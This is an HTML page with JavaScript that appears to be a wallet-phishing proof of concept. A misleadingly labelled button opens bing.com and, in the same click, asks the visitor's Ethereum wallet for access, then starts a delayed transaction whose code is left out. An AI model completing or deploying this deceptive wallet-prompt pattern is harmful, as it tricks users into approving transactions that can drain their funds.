<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <center>
    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
  </center>

  <div id="consoleOutput"></div>

  <script>
    function logToConsole(message) {
      const consoleOutput = document.getElementById("consoleOutput");
      const logEntry = document.createElement("p");
      logEntry.textContent = message;
      consoleOutput.appendChild(logEntry);
    }

    async function openBingAndPromptWallet() {
      logToConsole("Opening Bing.com...");
      window.open('https://bing.com', 'x');

      try {
        await promptWalletConnection();
        logToConsole('Wallet connected successfully!');

        logToConsole("Waiting 5 seconds before performing transaction...");
        setTimeout(performTransaction, 5000); // Delay for 5 seconds (adjust as needed)
      } catch (error) {
        logToConsole('Wallet connection or transaction failed: ' + error);
      }
    }

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          await ethereum.request({ method: 'eth_requestAccounts' });
        } catch (error) {
          throw new Error('Wallet connection request rejected by the user.');
        }
      } else {
        throw new Error('Web3 (Ethereum provider) is not available in this browser.');
      }
    }

    async function performTransaction() {
      logToConsole("Initiating transaction...");
      
      // ... (rest of the transaction code)

      try {
        // ... (rest of the transaction request and handling)
      } catch (error) {
        logToConsole('Transaction failed: ' + error.message);
      }
    }
  </script>
</body>
</html>
